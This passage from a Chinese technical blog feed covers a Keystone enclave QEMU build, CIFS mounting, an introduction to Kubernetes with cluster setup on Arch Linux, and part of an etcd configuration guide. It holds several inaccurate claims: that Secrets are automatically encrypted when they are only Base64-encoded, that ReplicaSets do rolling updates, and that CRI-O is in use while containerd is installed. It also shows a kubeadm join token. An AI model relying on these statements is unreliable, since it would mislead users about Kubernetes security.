class="line"><span class="comment">#构建hello模块</span></span><br><span class="line">make hello-package</span><br><span class="line"><span class="comment">#将生成的可执行文件拷贝到overlay/root目录，这个目录用于后面生成启动镜像</span></span><br><span class="line"><span class="comment">#overlay/root的目录的文件都会编译进镜像，后面上电启动开发版，这些文件都能找到</span></span><br><span class="line"><span class="built_in">cp</span> examples/hello/hello.ke ./overlay/root</span><br><span class="line"><span class="comment">#构建镜像</span></span><br><span class="line">make image</span><br></pre></td></tr></table></figure><h3 id="5-使用qemu运行"><a href="#5-使用qemu运行" class="headerlink" title="5. 使用qemu运行"></a>5. 使用qemu运行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./scripts/run-qemu.sh</span><br></pre></td></tr></table></figure><h3 id="6-进入到qemu"><a href="#6-进入到qemu" class="headerlink" title="6. 进入到qemu"></a>6. 进入到qemu</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加载keystone内核模块</span></span><br><span class="line">insmod keystone-driver.ko</span><br><span class="line"><span class="comment">#运行可执行文件</span></span><br><span class="line">./hello.ke</span><br></pre></td></tr></table></figure><p>参考:<a href="https://docs.keystone-enclave.org/en/latest/Getting-Started/Tutorials/Build-Enclave-App-Hello-World.html">https://docs.keystone-enclave.org/en/latest/Getting-Started/Tutorials/Build-Enclave-App-Hello-World.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 软件配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cifs文件系统从windows挂载到linux</title>
      <link href="/2023/03/31/cifs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%BB%8Ewindows%E6%8C%82%E8%BD%BD%E5%88%B0linux/"/>
      <url>/2023/03/31/cifs%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E4%BB%8Ewindows%E6%8C%82%E8%BD%BD%E5%88%B0linux/</url>
      
        <content type="html"><![CDATA[<p>参考原文链接<a href="https://blog.51cto.com/u_15380887/4596626">https://blog.51cto.com/u_15380887/4596626</a></p><p>bug:<br>出现乱码，首先确认在挂载的时候有没有指定字符集</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>kubernetes集群部署</title>
      <link href="/2023/03/30/kubernetes%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/"/>
      <url>/2023/03/30/kubernetes%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="kubernetes简单入门"><a href="#kubernetes简单入门" class="headerlink" title="kubernetes简单入门"></a>kubernetes简单入门</h1><h2 id="1-kubernetes是什么"><a href="#1-kubernetes是什么" class="headerlink" title="1.kubernetes是什么?"></a>1.kubernetes是什么?</h2><p>Kubernetes 是一个可移植、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态，其服务、支持和工具的使用范围相当广泛。</p><p><strong>Kubernetes</strong> 这个名字源于希腊语，意为“舵手”或“飞行员”。k8s 这个缩写是因为 k 和 s 之间有八个字符的关系。 Google 在 2014 年开源了 Kubernetes 项目。 Kubernetes 建立在<a href="https://research.google/pubs/pub43438">Google 大规模运行生产工作负载十几年经验</a>的基础上， 结合了社区中最优秀的想法和实践。</p><h2 id="2-kubernetes组件"><a href="#2-kubernetes组件" class="headerlink" title="2.kubernetes组件"></a>2.kubernetes组件</h2><h3 id="2-1-控制平面组件（Control-Plane-Components"><a href="#2-1-控制平面组件（Control-Plane-Components" class="headerlink" title="2.1.控制平面组件（Control Plane Components)"></a>2.1.控制平面组件（Control Plane Components)</h3><h5 id="2-1-1-kube-apiserver"><a href="#2-1-1-kube-apiserver" class="headerlink" title="2.1.1.kube-apiserver"></a>2.1.1.kube-apiserver</h5><p>API 服务器是 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 该组件负责公开了 Kubernetes API，负责处理接受请求的工作。 API 服务器是 Kubernetes 控制平面的前端。</p><p>Kubernetes API 服务器的主要实现是 <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-apiserver/">kube-apiserver</a>。 <code>kube-apiserver</code> 设计上考虑了水平扩缩，也就是说，它可通过部署多个实例来进行扩缩。 你可以运行 <code>kube-apiserver</code> 的多个实例，并在这些实例之间平衡流量。</p><h5 id="2-1-2-kube-scheduler"><a href="#2-1-2-kube-scheduler" class="headerlink" title="2.1.2.kube-scheduler"></a>2.1.2.kube-scheduler</h5><p><code>kube-scheduler</code> 是<a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 负责监视新创建的、未指定运行<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>的 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pods</a>， 并选择节点来让 Pod 在上面运行。</p><p>调度决策考虑的因素包括单个 Pod 及 Pods 集合的资源需求、软硬件及策略约束、 亲和性及反亲和性规范、数据位置、工作负载间的干扰及最后时限。</p><h5 id="2-1-3-kube-controller-manager"><a href="#2-1-3-kube-controller-manager" class="headerlink" title="2.1.3.kube-controller-manager"></a>2.1.3.kube-controller-manager</h5><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-controller-manager/">kube-controller-manager</a> 是<a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 负责运行<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/">控制器</a>进程。</p><p>从逻辑上讲， 每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/">控制器</a>都是一个单独的进程， 但是为了降低复杂性，它们都被编译到同一个可执行文件，并在同一个进程中运行。</p><p>这些控制器包括：</p><ul><li>节点控制器（Node Controller）：负责在节点出现故障时进行通知和响应</li><li>任务控制器（Job Controller）：监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成</li><li>端点控制器（Endpoints Controller）：填充端点（Endpoints）对象（即加入 Service 与 Pod）</li><li>服务帐户和令牌控制器（Service Account &amp; Token Controllers）：为新的命名空间创建默认帐户和 API 访问令牌</li></ul><h5 id="2-1-4-cloud-controller-manager"><a href="#2-1-4-cloud-controller-manager" class="headerlink" title="2.1.4.cloud-controller-manager"></a>2.1.4.cloud-controller-manager</h5><p><code>cloud-controller-manager</code> 是指嵌入特定云的控制逻辑之 <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>组件。 <code>cloud-controller-manager</code> 允许你将你的集群连接到云提供商的 API 之上， 并将与该云平台交互的组件同与你的集群交互的组件分离开来。</p><p><code>cloud-controller-manager</code> 仅运行特定于云平台的控制器。 因此如果你在自己的环境中运行 Kubernetes，或者在本地计算机中运行学习环境， 所部署的集群不需要有云控制器管理器。</p><p>与 <code>kube-controller-manager</code> 类似，<code>cloud-controller-manager</code> 将若干逻辑上独立的控制回路组合到同一个可执行文件中， 供你以同一进程的方式运行。 你可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。</p><p>下面的控制器都包含对云平台驱动的依赖：</p><ul><li>节点控制器（Node Controller）：用于在节点终止响应后检查云提供商以确定节点是否已被删除</li><li>路由控制器（Route Controller）：用于在底层云基础架构中设置路由</li><li>服务控制器（Service Controller）：用于创建、更新和删除云提供商负载均衡器</li></ul><h5 id="2-1-5-etcd"><a href="#2-1-5-etcd" class="headerlink" title="2.1.5.etcd"></a>2.1.5.etcd</h5><p><code>etcd</code> 是兼顾一致性与高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库。</p><p>你的 Kubernetes 集群的 <code>etcd</code> 数据库通常需要有个<a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/configure-upgrade-etcd/#backing-up-an-etcd-cluster">备份</a>计划。</p><p>如果想要更深入的了解 <code>etcd</code>，请参考 <a href="https://etcd.io/docs/">etcd 文档</a>。</p><h3 id="2-2-Node-组件"><a href="#2-2-Node-组件" class="headerlink" title="2.2.Node 组件"></a>2.2.Node 组件</h3><h5 id="2-2-1-kubelet"><a href="#2-2-1-kubelet" class="headerlink" title="2.2.1.kubelet"></a>2.2.1.kubelet</h5><p><code>kubelet</code> 会在集群中每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>上运行。 它保证<a href="https://kubernetes.io/zh-cn/docs/concepts/overview/what-is-kubernetes/#why-containers">容器（containers）</a>都运行在 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 中。</p><p>kubelet 接收一组通过各类机制提供给它的 PodSpecs， 确保这些 PodSpecs 中描述的容器处于运行状态且健康。 kubelet 不会管理不是由 Kubernetes 创建的容器。</p><h5 id="2-2-2-kube-proxy"><a href="#2-2-2-kube-proxy" class="headerlink" title="2.2.2.kube-proxy"></a>2.2.2.kube-proxy</h5><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-proxy/">kube-proxy</a> 是集群中每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>所上运行的网络代理， 实现 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/">服务（Service）</a> 概念的一部分。</p><p>kube-proxy 维护节点上的一些网络规则， 这些网络规则会允许从集群内部或外部的网络会话与 Pod 进行网络通信。</p><p>如果操作系统提供了可用的数据包过滤层，则 kube-proxy 会通过它来实现网络规则。 否则，kube-proxy 仅做流量转发。</p><h5 id="2-2-3-Flannel-Kubernetes网络组件"><a href="#2-2-3-Flannel-Kubernetes网络组件" class="headerlink" title="2.2.3.Flannel(Kubernetes网络组件)"></a>2.2.3.Flannel(Kubernetes网络组件)</h5><p>Flannel是Kubernetes中一种常用的网络插件，用于为集群中的Pod提供网络互联。它使用了一种名为VXLAN（Virtual Extensible LAN）的技术来创建覆盖整个Kubernetes集群的虚拟网络。</p><p>具体来说，Flannel使用以下方式工作：</p><p>1.初始化：当Flannel代理节点启动时，它会为每个节点分配一个唯一的、未使用的子网(CIDR)地址段，通过etcd存储这些地址段信息，并将其称为“网络配置”。</p><p>2.分配IP地址：当需要为一个新的Pod分配IP地址时，Flannel会从网络配置中选择一个可用的子网，然后在该子网中为该Pod分配一个IP地址。Flannel会确保所选子网中的任何其他Pod都不会使用相同的IP地址。</p><p>3.创建网络隧道：为了将不同节点上的Pod连接起来，Flannel会创建一组网络隧道。具体来说，它会在每个节点上创建一个虚拟网络接口vxlan0，并将其绑定到一个物理网络接口（如eth0）。然后，Flannel会使用VXLAN技术，在不同节点之间创建一个覆盖整个Kubernetes集群的虚拟网络。<br>4.数据传输：当两个Pod需要进行通信时，它们会像单个计算机内部的进程一样通信。数据包被发送到本地的虚拟网络接口vxlan0，并通过创建的隧道传输到目标节点上的vxlan0接口。然后，数据包被路由到目标Pod。</p><h2 id="3-kubernetes的资源对象"><a href="#3-kubernetes的资源对象" class="headerlink" title="3.kubernetes的资源对象"></a>3.kubernetes的资源对象</h2><ul><li>1.ReplicationController</li><li>2.ReplicationSet</li><li>3.Deployment</li><li>4.Ingress</li><li>5.Secret</li></ul><h5 id="1-ReplicationController"><a href="#1-ReplicationController" class="headerlink" title="1.ReplicationController"></a>1.ReplicationController</h5><p>Replication Controller（RC）是一种核心资源对象，用于确保指定数量的Pod副本正在运行。它允许用户定义一个Pod模板，并创建多个相同的Pod副本，以便在集群中部署和管理应用程序容器。</p><p>具体来说，Replication Controller 可以确保满足以下条件：<br>1.运行指定数量的 Pod 副本：用户可以通过 RC 对象指定需要创建和维护的Pod副本数。</p><p>2.重启崩溃的 Pod：当某个 Pod 崩溃或被删除时，RC会自动创建一个新的 Pod 副本来代替它。</p><p>3.控制 Pod 的生命周期：用户可以使用 RC 来进行滚动更新、扩容&#x2F;缩容等操作，而无需手动管理每个 Pod 的状态。<br>Replication Controller已经不被推荐使用，而是使用ReplicationSet或者Deployment进行代替</p><h5 id="2-ReplicationSet"><a href="#2-ReplicationSet" class="headerlink" title="2.ReplicationSet"></a>2.ReplicationSet</h5><p>ReplicaSet（RS）是一种资源对象，用于确保指定数量的 Pod 副本正在运行。类似于 Replication Controller（RC），但 RS 具有更多高级的功能。</p><p>1.与 RC 不同的是，RS 可以使用 Label Selector 来选择要管理的 Pod 子集，从而允许用户根据其需要更精细地控制 Pod 的创建和删除。例如，用户可以定义一个 Label Selector 来选择特定类型的 Pod，并在满足一些特定条件时自动扩展或缩小该 Pod 集合。</p><p>2.此外，RS 还支持滚动升级，即在更新 Pod 模板时逐步替换现有 Pod 副本，以实现应用程序的无缝升级，这在 RC 中是不支持的。</p><p>3.总之，ReplicaSet 是 Kubernetes 中一种关键的资源对象，用于管理 Pod 的副本集。它提供了比 RC 更高级的功能，如 Label Selector、滚动升级等，使得管理和部署应用程序变得更加灵活和可靠。</p><h5 id="3-Deployment"><a href="#3-Deployment" class="headerlink" title="3.Deployment"></a>3.Deployment</h5><p>1.Deployment 是一种资源对象，用于管理 Pod 副本集的创建、更新和删除等操作。Deployment 通常建立在 ReplicaSet（RS）之上，并通过动态地创建、更新和删除 RS 对象来实现应用程序的无缝升级和回滚。</p><p>2.Deployment 允许用户指定一个 Pod 模板，并定义需要创建和维护的 Pod 副本数。然后，当需要更新应用程序时，用户可以修改 Pod 模板，并通过 Deployment 对象进行滚动升级，以逐步替换现有 Pod 副本。如果更新失败或出现问题，Deployment 还支持回滚操作，以自动恢复到先前的稳定状态。</p><p>3.此外，Deployment 还支持暂停&#x2F;恢复操作，允许用户在更新过程中暂停所有 Pod 的创建和删除，以便进行一些必要的检查和修复。</p><h5 id="4-Service"><a href="#4-Service" class="headerlink" title="4.Service"></a>4.Service</h5><p>具体来说，Service 可以帮助用户实现以下功能：</p><p>1.发现和路由：通过 Service 对象，用户可以为一组 Pod 创建一个稳定的 IP 和端口，并使用该 IP 和端口将请求路由到集群中的任何一个 Pod 上。</p><p>2.负载均衡：当多个 Pod 共享同一个 Service 时，Kubernetes 会自动为这些 Pod 进行负载均衡，从而分摊请求流量并提高系统的可靠性和性能。</p><p>3.健康检查：Service 还支持对后端 Pod 的健康状态进行检查，并在发现故障时自动调整路由策略，从而保证应用程序的可用性和稳定性。</p><h5 id="5-Secret"><a href="#5-Secret" class="headerlink" title="5.Secret"></a>5.Secret</h5><p>Secret 是一种资源对象，用于存储敏感数据，例如密码、API 密钥、证书等。它提供了一种安全地将这些敏感数据传递给容器的方法，同时也可以确保这些数据在传输和存储过程中得到加密和保护。</p><p>具体来说，Secret 可以用于以下场景：</p><p>1.存储密码和机密数据：例如数据库密码、SSH 密钥等。</p><p>2.存储 TLS 证书：例如 HTTPS 网站所需的证书和私钥。</p><p>3.存储 API 认证密钥：例如 OAuth 鉴权所需的令牌信息等。</p><p>在使用 Secret 时，用户需要先创建一个 Secret 对象，并将需要存储的数据放到其中。然后，可以通过 Pod 的环境变量、卷挂载等方式，将这些数据传递给容器。Kubernetes 会自动将 Secret 数据转换为 Base64 编码格式，并在传输和存储过程中对其进行加密和保护。</p><h5 id="6-Ingress"><a href="#6-Ingress" class="headerlink" title="6.Ingress"></a>6.Ingress</h5><p>Ingress 是一种资源对象，用于管理对集群中 Service 的 HTTP&#x2F;HTTPS 访问，并允许用户使用类似于 Nginx 的路由规则将流量路由到不同的服务或后端 Pod 上。</p><p>具体来说，Ingress 可以实现以下功能：</p><p>1.路由：使用 Ingress 规则，将入站请求路由到指定的 Service 或后端 Pod 上。</p><p>2.HTTPS 支持：通过定义 TLS 证书和私钥，Ingress 可以实现终止和解密传入的 HTTPS 连接，并在转发请求时重新加密。</p><p>3.负载均衡：当多个 Pod 共享同一个 Ingress 时，Kubernetes 会自动为这些 Pod 进行负载均衡，从而分摊请求流量并提高系统的可靠性和性能。</p><p>4.应用程序层通信：可以使用 Ingress 控制器实现应用程序层的通信，例如 WebSocket、HTTP&#x2F;2 等。</p><p>注意，Ingress本身并不提供负载均衡功能，只是简单的将各个匹配规则的流量转发到各个Service，虽然Ingress会有负载均衡算法，但是这些负载均衡算法是告诉Service的，实际的负载均衡是Service来做的</p><h2 id="4-kubernetes集群部署"><a href="#4-kubernetes集群部署" class="headerlink" title="4.kubernetes集群部署"></a>4.kubernetes集群部署</h2><p>本教程基于Archlinux，其他发行版大体步骤类似<br>容器引擎基于CRI-O</p><h3 id="1-安装必要的组件"><a href="#1-安装必要的组件" class="headerlink" title="1.安装必要的组件"></a>1.安装必要的组件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pacman -S kubeadm kubelet kubectl containerd </span><br><span class="line"><span class="comment">#kubeadm用于管理kubernetes的工具</span></span><br><span class="line"><span class="comment">#kubectl用于控制kubernetes集群的工具</span></span><br><span class="line"><span class="comment">#cri-o 一种专门为kubernetes设计的容器引擎</span></span><br></pre></td></tr></table></figure><h3 id="2-准备好必要的组件"><a href="#2-准备好必要的组件" class="headerlink" title="2.准备好必要的组件"></a>2.准备好必要的组件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#加载内核模块</span></span><br><span class="line">modprobe br_netfilter</span><br><span class="line">modprobe overlay</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; /lib/modules-load.d/10-kubernetes.conf &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">br_netfilter</span></span><br><span class="line"><span class="string">overlay</span></span><br><span class="line"><span class="string">ip_vs</span></span><br><span class="line"><span class="string">ip_vs_wr</span></span><br><span class="line"><span class="string">ip_vs_wrr</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt; /etc/sysctl.d/k8s.conf &lt;&lt; <span class="string">EOF </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-ip6tables = 1 </span></span><br><span class="line"><span class="string">net.bridge.bridge-nf-call-iptables = 1 </span></span><br><span class="line"><span class="string">net.ipv4.ip_forward = 1</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line"></span><br><span class="line">sysctl -p</span><br></pre></td></tr></table></figure><h3 id="2-启动容器引擎"><a href="#2-启动容器引擎" class="headerlink" title="2.启动容器引擎"></a>2.启动容器引擎</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start crio</span><br></pre></td></tr></table></figure><h3 id="3-初始化集群"><a href="#3-初始化集群" class="headerlink" title="3.初始化集群"></a>3.初始化集群</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo kubeadm init --image-repository=registry.aliyuncs.com/google_containers --pod-network-cidr=10.254.0.0/16 --service-cidr=10.253.0.0/16 --cri-socket=unix:///var/run/containerd/containerd.sock</span><br><span class="line"><span class="comment">#指定国内的镜像仓库，不然可能会拉取镜像失败</span></span><br><span class="line"><span class="comment">#--pod-network-cidr指定pod网段</span></span><br><span class="line"><span class="comment">#--service-cidr指定svc网段</span></span><br><span class="line"><span class="comment">#--cri-socket指定容器引擎的socket</span></span><br></pre></td></tr></table></figure><h3 id="4-创建集群成功"><a href="#4-创建集群成功" class="headerlink" title="4.创建集群成功"></a>4.创建集群成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Your Kubernetes control-plane has initialized successfully!</span><br><span class="line"></span><br><span class="line">To start using your cluster, you need to run the following as a regular user:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/.kube</span><br><span class="line">  sudo <span class="built_in">cp</span> -i /etc/kubernetes/admin.conf <span class="variable">$HOME</span>/.kube/config</span><br><span class="line">  sudo <span class="built_in">chown</span> $(<span class="built_in">id</span> -u):$(<span class="built_in">id</span> -g) <span class="variable">$HOME</span>/.kube/config</span><br><span class="line"></span><br><span class="line">Alternatively, <span class="keyword">if</span> you are the root user, you can run:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">export</span> KUBECONFIG=/etc/kubernetes/admin.conf</span><br><span class="line"></span><br><span class="line">You should now deploy a pod network to the cluster.</span><br><span class="line">Run <span class="string">&quot;kubectl apply -f [podnetwork].yaml&quot;</span> with one of the options listed at:</span><br><span class="line">  https://kubernetes.io/docs/concepts/cluster-administration/addons/</span><br><span class="line"></span><br><span class="line">Then you can <span class="built_in">join</span> any number of worker nodes by running the following on each as root:</span><br><span class="line"></span><br><span class="line">kubeadm <span class="built_in">join</span> 192.168.1.250:6443 --token 6xfvp5.9gdoo9c9xp87cn4c \</span><br><span class="line">        --discovery-token-ca-cert-hash sha256:cd43db87da74dbcb3fb4eedf4bfdb454a175431928f8accbac331a357797e104</span><br></pre></td></tr></table></figure><h3 id="5-安装网络插件"><a href="#5-安装网络插件" class="headerlink" title="5.安装网络插件"></a>5.安装网络插件</h3><p>参考<br><a href="https://kubernetes.io/zh-cn/docs/concepts/cluster-administration/addons/#networking-and-network-policy">https://kubernetes.io/zh-cn/docs/concepts/cluster-administration/addons/#networking-and-network-policy</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">wget https://github.com/flannel-io/flannel/releases/latest/download/kube-flannel.yml</span><br><span class="line"><span class="comment">#修改文件中的网段修改成自己创建集群时候的pod网段</span></span><br><span class="line"><span class="comment">#创建启动 flannel pod</span></span><br><span class="line">kubectl apply -f ./kube-flannel.yml</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h5 id="1-apiserver以及etcd重启问题"><a href="#1-apiserver以及etcd重启问题" class="headerlink" title="1.apiserver以及etcd重启问题"></a>1.apiserver以及etcd重启问题</h5><p>对于systemd启动的linux系统，我们需要将容器引擎的资源分配策略改为systemd<br>containerd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[plugins.<span class="string">&quot;io.containerd.grpc.v1.cri&quot;</span>.containerd.runtimes.runc.options]</span><br><span class="line">  BinaryName = <span class="string">&quot;&quot;</span></span><br><span class="line">  CriuImagePath = <span class="string">&quot;&quot;</span></span><br><span class="line">  CriuPath = <span class="string">&quot;&quot;</span></span><br><span class="line">  CriuWorkPath = <span class="string">&quot;&quot;</span></span><br><span class="line">  IoGid = 0</span><br><span class="line">  IoUid = 0</span><br><span class="line">  NoNewKeyring = <span class="literal">false</span></span><br><span class="line">  NoPivotRoot = <span class="literal">false</span></span><br><span class="line">  Root = <span class="string">&quot;&quot;</span></span><br><span class="line">  ShimCgroup = <span class="string">&quot;&quot;</span></span><br><span class="line">  SystemdCgroup = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h3 id="2-网络问题"><a href="#2-网络问题" class="headerlink" title="2.网络问题"></a>2.网络问题</h3><p>对于crio容器引擎可能需要指定网络插件配置文件的目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/crio/crio.conf</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[crio.network]</span><br><span class="line">plugin_dirs = [</span><br><span class="line"><span class="string">&quot;/opt/cni/bin&quot;</span>,</span><br><span class="line">]</span><br><span class="line"><span class="comment">#在修改这个配置文件前确认这个文件下有没有配置文件</span></span><br><span class="line"><span class="comment">#重启crio和kubelet</span></span><br><span class="line">systemctl restart crio kubelet</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>etcd配置详解</title>
      <link href="/2023/03/26/etcd%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/"/>
      <url>/2023/03/26/etcd%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="etcd配置详解"><a href="#etcd配置详解" class="headerlink" title="etcd配置详解"></a>etcd配置详解</h1><h3 id="1-什么是etcd？"><a href="#1-什么是etcd？" class="headerlink" title="1.什么是etcd？"></a>1.什么是etcd？</h3><p>etcd是一个开源的分布式键值存储系统，它用于在集群中的多个节点之间共享数据。etcd最初由CoreOS团队开发，现在由Cloud Native Computing Foundation (CNCF) 维护。etcd通常与Kubernetes一起使用，以存储和同步Kubernetes集群的配置信息和元数据。除了Kubernetes之外，etcd还可以用于其他分布式系统，例如OpenStack、Apache Mesos等。</p><h3 id="2-etcd的使用场景"><a href="#2-etcd的使用场景" class="headerlink" title="2.etcd的使用场景"></a>2.etcd的使用场景</h3><ul><li><p>1.Kubernetes集群控制平面的数据存储：etcd存储Kubernetes集群的配置信息、状态和元数据，确保在多个节点之间同步。</p></li><li><p>2.服务发现和负载均衡：etcd可以存储服务注册表，以便其他服务可以查询可用的服务实例并进行负载均衡。</p></li><li><p>3.分布式锁：etcd提供了一个基于租约的分布式锁实现，可以防止多个客户端同时修改相同的资源。</p></li><li><p>4.配置管理：etcd可以存储应用程序的配置信息，并允许应用程序在运行时动态更新这些配置。</p></li><li><p>5日志聚合：etcd可以用于存储日志收集器的配置和元数据，以便管理和监控日志收集器。<br>总之，etcd可以作为任何需要共享数据的分布式系统的通用数据存储解决方案。</p></li></ul><h3 id="3-etcd对比redis"><a href="#3-etcd对比redis" class="headerlink" title="3.etcd对比redis"></a>3.etcd对比redis</h3><p>tcd和Redis都是基于内存的键值对数据库，但它们有不同的设计目标和使用场景：</p><ul><li><p>1.etcd是一个专为分布式系统设计的键值对数据库，用于在多个节点之间共享配置信息和元数据，通常与Kubernetes等容器编排工具配合使用。</p></li><li><p>2.Redis是一个广泛用于缓存、消息队列、实时统计、地理位置等应用的内存数据库，支持多种数据结构和丰富的操作。</p></li></ul><p>相对而言，etcd更加注重数据的一致性和高可用性，并提供了一些特定于分布式环境下的功能，例如基于租约的分布式锁。而Redis则更侧重于快速的读写性能和丰富的数据处理能力。</p><h3 id="4-etcd配置"><a href="#4-etcd配置" class="headerlink" title="4.etcd配置"></a>4.etcd配置</h3><p>1.安装etcd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#基于Archlinux</span></span><br><span class="line">pacman -S etcd <span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2.配置etcd<br>由于Archlinux安装etcd后生成的etcd.service文件中并没有指定etcd的配置文件，因此我们可以修改&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;etcd.service文件的配置参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=etcd key-value store</span><br><span class="line">Documentation=https://github.com/etcd-io/etcd</span><br><span class="line">After=network-online.target local-fs.target remote-fs.target time-sync.target</span><br><span class="line">Wants=network-online.target local-fs.target remote-fs.target time-sync.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=etcd</span><br><span class="line">Type=notify</span><br><span class="line">Environment=ETCD_DATA_DIR=/var/lib/etcd</span><br><span class="line">Environment=ETCD_NAME=%m</span><br><span class="line">ExecStart=/usr/bin/etcd --config-file /etc/etcd/etcd.conf #这里指定配置文件</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=10s</span><br><span class="line">LimitNOFILE=40000</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span 